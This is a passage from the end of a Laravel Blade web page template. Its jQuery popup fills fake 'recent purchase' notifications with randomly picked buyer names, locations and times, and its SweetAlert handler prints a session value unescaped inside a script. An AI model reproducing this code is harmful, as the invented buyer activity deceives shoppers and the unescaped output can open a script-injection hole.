            	$(".custom-sales-notification").stop().slideToggle('slow');
            	
            }, intTime);
            */




            var flag = 0;
            var counter = 4000;
            var ftime = 0;
            if (ftime == 0) {
                counter = 9000;
            }
            ftime = ftime + 1;
            var myFunction = function() {
                if (flag == 0) {
                    counter = 4000;
                    flag = 1;
                } else {
                    flag = 0;
                    counter = 9000;
                }

                ftime = ftime + 1;



                if ($('.custom-sales-notification').css('display') == 'none') {
                    random = Math.floor(Math.random() * locations.length);
                    $("#buyerlocation").html(locations[random]);

                    random = Math.floor(Math.random() * name.length);
                    displayname = name[random];
                    $("#buyername").html(displayname);
                    $("#nameletter").html(displayname.charAt(0));

                    random = Math.floor(Math.random() * time.length);
                    $("#buyertime").html(time[random]);
                }


                $(".custom-sales-notification").stop().slideToggle('slow');


                clearInterval(interval);
                interval = setInterval(myFunction, counter);
            }
            var interval = setInterval(myFunction, counter);

            $(".custom-close").click(function() {
                $(".custom-sales-notification").stop().slideToggle('slow');
                clearInterval(interval);
            });

        });
    </script>

    <!-- Notification script Ends -->
</body>

</html>
@include('sweetalert::alert')
@yield('script')
@if (session('success'))
    <script>
        "use strict";
        $(document).ready(function() {
            swal("Success!", "{{ session('success') }}", "success");
        });
    </script>
@endif

@if (session('alert'))
    <script>
        "use strict";
        $(document).ready(function() {
            swal("Sorry!", "{{ session('alert') }}", "error");
        });
    </script>
@endif
@if (session('html_alert'))
    <script>
        "use strict";
        $(document).ready(function() {
            swal("Sorry!", "{!! session('html_alert') !!}", "error");
        });
    </script>
@endif
<script>
    @if (Session::has('message'))
        "use strict";
        var type = "{{ Session::get('alert-type', 'info') }}";
        switch (type) {
        case 'info':
        toastr.info("{{ Session::get('message') }}");
        break;
        case 'warning':
        toastr.warning("{{ Session::get('message') }}");
        break;
        case 'success':
        toastr.success("{{ Session::get('message') }}");
        break;
        case 'error':
        toastr.error("{{ Session::get('message') }}");
        break;
        } @endif
</script>
<script type="text/javascript">
    $(window).on('load', function() {
        // $('#modal-notification').modal('show');
    });
</script>
